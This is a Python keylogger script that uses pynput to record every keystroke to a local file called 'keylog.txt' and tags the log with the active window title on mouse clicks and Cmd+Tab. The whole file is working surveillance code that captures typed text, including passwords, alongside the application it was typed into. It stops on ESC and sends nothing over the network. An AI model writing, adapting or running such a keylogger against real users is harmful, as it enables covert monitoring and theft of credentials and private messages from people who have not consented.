from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from pynput.keyboard import Key
import pygetwindow as gw
import sys

log_file = "keylog.txt"

# Global variable to store the last recorded active window
last_window = None

# Function to check the current active window


def check_current_window():
    global last_window
    current_window = gw.getActiveWindow()
    current_title = current_window.title()

    # Check if the current window has changed compared to the last recorded window
    if current_title != last_window:
        print(f"Window changed: {current_title}")
        # Log the new window title to the log file
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[{current_title}]\n")

        # Update the last recorded window title
        last_window = current_title
    return current_window


# Keyboard event handling
key_command_press = False
key_tab_press = False


def on_press(key):
    global key_command_press, key_tab_press

    try:
        # Open log file and write the pressed key
        with open(log_file, "a", encoding="utf-8") as f:
            if key == Key.cmd:
                key_command_press = True
            elif key == Key.tab:
                key_tab_press = True
            elif key_command_press and key_tab_press:
                # If Cmd + Tab is pressed, log the current window title
                f.write(f"\n\n[{check_current_window().title()}]\n")
                # End the current line
                key_command_press = False  # Reset state
                key_tab_press = False
            else:
                try:
                    f.write(f"{key.char}")
                except AttributeError:
                    # Handle special keys (like Enter, Shift, etc.)
                    f.write(f"[{key.name}]")

    except Exception as e:
        print(f"Error occurred: {e}")

# Key release event handling


def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        print("Exiting listener")
        sys.exit()  # Exit the program when the ESC key is pressed

# Mouse click event handling


def on_click(x, y, button, pressed):
    if pressed:
        check_current_window()


# Start the mouse and keyboard listeners
mouse_listener = MouseListener(on_click=on_click)
keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)

mouse_listener.start()
keyboard_listener.start()

# Wait for the keyboard listener to stop (exit when ESC is pressed)
keyboard_listener.join()

# Stop the mouse listener
mouse_listener.stop()
